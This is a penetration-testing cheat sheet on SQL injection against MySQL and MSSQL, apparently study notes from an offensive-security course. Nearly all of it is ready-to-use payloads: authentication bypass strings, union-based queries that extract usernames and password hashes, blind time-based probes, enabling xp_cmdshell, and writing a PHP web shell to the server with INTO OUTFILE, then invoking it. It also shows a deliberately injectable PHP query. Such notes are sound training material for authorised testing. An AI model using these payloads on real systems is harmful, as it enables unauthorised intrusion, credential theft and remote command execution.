# SQL Injection

## Generatl Usage

MYSQL sign-in
```bash
mysql -u root -p'root' -h 192.168.50.16 -P 3306 --skip-ssl-verify-server-cert
```

```text
If ERROR 2026 (HY000) TLS/SSL error shows up, we can append --skip-ssl at the end of the command to connect to the database.
```

show version
```bash
select version();
```

enumeration users
```bash
select system_user();
```

```bash
show databases;
```

pull a user hash
```bash
SELECT user, authentication_string FROM mysql.user WHERE user = 'james';
```

MSSQL Sign-in
```bash
impacket-mssqlclient Administrator:password123@192.168.0.25 -windows-auth
```

MSSQL Version
```bash
SELECT @@version;
```

enumerate users
```bash
SELECT name FROM sys.databases;
```

get table schema
```bash
SELECT * FROM offsec.information_schema.tables;
```

read db table
```bash
select * from offsec.dbo.users;
```


## Injecting

a test
```bash
user'
```

a bypass (in user field)
```bash
user' OR 1=1 -- //
```

version enumeration
```bash
' or 1=1 in (select @@version) -- //
```

table enumeration
```bash
' OR 1=1 in (SELECT * FROM users) -- //
```

deeper enumeration
```bash
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

## Union-Based 

```bash
$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
```

cheeck columns for union-based attacks
```bash
' ORDER BY 1-- //
```

figure out what columns are displayed
```bash
%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
```

pulling columns (requires trial and error)
```text
%' UNION SELECT database(), user(), @@version, null, null -- //
' UNION SELECT null, null, database(), user(), @@version  -- //
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
' UNION SELECT null, username, password, description, null FROM users -- //
```

blind
```text
http://192.168.50.16/blindsqli.php?user=admin' AND 1=1 -- //
```

```text
http://192.168.50.16/blindsqli.php?user=admin' AND IF (1=1, sleep(3),'false') -- //
```

## Code Execution

mssql sign in
```bash
impacket-mssqlclient Administrator:password123@192.168.0.25 -windows-auth
```

```text
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```

mysql shell injection
```text
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

access that webshell
```text
http://server.local/tmp/webshell.php&cmd=id
```